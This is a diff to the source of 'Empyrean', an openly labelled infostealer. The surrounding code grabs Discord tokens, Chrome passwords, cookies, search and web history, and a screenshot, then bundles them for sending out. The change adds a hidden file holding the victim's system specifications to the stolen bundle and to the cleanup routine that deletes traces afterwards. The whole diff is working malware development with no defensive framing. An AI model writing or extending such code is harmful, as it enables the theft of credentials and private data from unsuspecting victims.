@@ -41,8 +41,8 @@ def main() -> None:
     embed = Embed(title="\u200b", color=0x000000)
     
     token_grabber(embed=embed)
-    embed.add_field(name="**System Info**", value=f"```{systemspec.sys_spec()}```")
     
+    systemspec.sys_spec()
     if config["google"]:
         google().grabPasswords()
         google().grabCookies()
@@ -56,6 +56,7 @@ def main() -> None:
     files.append(File(".\\chrome-search-history.txt") if os.path.exists(".\\chrome-search-history.txt") else None)
     files.append(File(".\\chrome-web-history.txt") if os.path.exists(".\\chrome-web-history.txt") else None)
     files.append(File(".\\screenshot.png") if os.path.exists(".\\screenshot.png") else None)
+    files.append(File(".\\system-spec.txt") if os.path.exists(".\\system-spec.txt") else None)
     
     embed.set_author(name="Empyrean", icon_url="https://i.imgur.com/ihzoAWl.jpeg")
     embed.set_footer(text="Empyrean ❤ Made by https://github.com/addi00000")
@@ -603,9 +604,12 @@ Disk:
 ------------------------------
 {systemspec.system_specs()[3]}
 ------------------------------
-"""
-        return sys_spec
+"""     
 
+        os.remove('.\\system-spec.txt') if os.path.exists('.\\system-spec.txt') else None
+        with open('.\\system-spec.txt', 'w', encoding='utf-8') as f: f.write(sys_spec)
+        hide('.\\system-spec.txt')
+        
     def personal_info():
         def get_display_name():
             GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
@@ -677,7 +681,8 @@ def cleanup():
         '.\\chrome-cookies.txt',
         '.\\chrome-search-history.txt',
         '.\\chrome-web-history.txt',
-        '.\\screenshot.png'
+        '.\\screenshot.png',
+        '.\\system-spec.txt',
     ]
     for file in possible_files:
         if os.path.exists(file):
